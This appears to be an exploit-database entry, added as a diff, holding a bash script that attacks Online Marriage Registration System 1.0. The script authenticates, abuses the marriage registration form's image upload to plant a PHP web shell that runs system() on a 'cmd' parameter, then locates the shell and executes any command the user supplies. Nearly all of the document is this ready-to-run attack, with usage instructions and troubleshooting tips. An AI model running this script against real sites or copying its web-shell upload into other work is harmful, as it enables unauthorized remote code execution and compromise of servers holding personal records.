@@ -1,0 +1,52 @@
+# Exploit Title: Online Marriage Registration System 1.0 Remote Code Execution
+# Google Dork: N/A
+# Date: 2020-05-31
+# Exploit Author: Selim Enes 'Enesdex' Karaduman
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/online-marriage-registration-system-using-php-and-mysql/
+# Version: 1.0
+# Tested on: Windows 10 / Xampp Server and Wamp Server
+# CVE : N/A
+# Notes : Exploit Requires Authentication But You Can Register As User For Free, This Is Enough To Exploit System
+
+#!/bin/bash
+echo "# Online Marriage Registration System 1.0 ---> Remote Code Execution"
+echo "# Author ---> Selim Enes Karaduman"
+echo "# Usage ---> ./exploit.sh -u TARGET_URL(e.g http://10.10.10.10/omrs/ -m MOBILE_NUMBER -p PASSWORD -c COMMAND"
+while getopts u:m:p:c: par
+do
+case $par in
+u) url=$OPTARG ;;
+m) mnum=$OPTARG ;;
+p) passwd=$OPTARG ;;
+c) command=$OPTARG ;;
+esac
+done
+sess=$(curl -s -i -X POST $url/user/login.php -d "mobno=$mnum&password=$passwd&login=" | grep -F "Set-Cookie" | sed 's/;//g' | cut -d " " -f 2)
+url_for_req=$(echo $url | cut -d "/" -f 3)
+function upload(){
+curl -i -s -k -X $'POST' \
+    -H $"Host: $url_for_req" -H $'Content-Type: multipart/form-data; boundary=---------------------------8759967759481129101498329242' -H $"Cookie: $sess" -H $'Content-Length: 3244' \
+    -b $"$sess" \
+    --data-binary $'-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"dom\"\x0d\x0a\x0d\x0a05/01/2020\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"nofhusband\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"husimage\"; filename=\"a.php\"\x0d\x0aContent-Type: application/x-php\x0d\x0a\x0d\x0a<?php\x0aecho system($_GET[\'cmd\']);\x0a?>\x0a\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"hreligion\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"hdob\"\x0d\x0a\x0d\x0a05/01/2020\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"hsbmarriage\"\x0d\x0a\x0d\x0aBachelor\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"haddress\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"hzipcode\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"hstate\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"hadharno\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"nofwife\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"wifeimage\"; filename=\"test.jpg\"\x0d\x0aContent-Type: image/jpeg\x0d\x0a\x0d\x0ahi\x0a\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"wreligion\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"wdob\"\x0d\x0a\x0d\x0a05/01/2020\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"wsbmarriage\"\x0d\x0a\x0d\x0aBachelor\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"waddress\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"wzipcode\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"wstate\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"wadharno\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"witnessnamef\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"waddressfirst\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"witnessnames\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"waddresssec\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"witnessnamet\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"waddressthird\"\x0d\x0a\x0d\x0atest\x0d\x0a-----------------------------8759967759481129101498329242\x0d\x0aContent-Disposition: form-data; name=\"submit\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------8759967759481129101498329242--\x0d\x0a' \
+    $"$url/user/marriage-reg-form.php" >>/dev/null
+}
+upload
+
+#Execute the given command
+shell_file=$(curl -s $url/user/images/ | grep ".php" | grep -Eo 'href="[^\"]+"' | sed 's/href=//g' | sed 's/\"//g' | grep -m1 '')
+
+
+check=$(echo $command | grep " " | wc -l)
+if [[ $check > 0 ]]
+then
+fixed_command=$(echo $command | sed 's/ /%20/g')
+curl -s "$url/user/images/$shell_file?cmd=$fixed_command"
+else
+curl -s "$url/user/images/$shell_file?cmd=$command"
+fi
+
+
+echo "IF YOU DONT GET RESPONSE OF THE COMMAND YOU GAVE, PROBABLY YOU GAVE WRONG CREDENTIALS"
+echo "After first exploit, even if you give wrong credentials it'll work since the file is already uploaded"
+shift $((OPTIND-1))
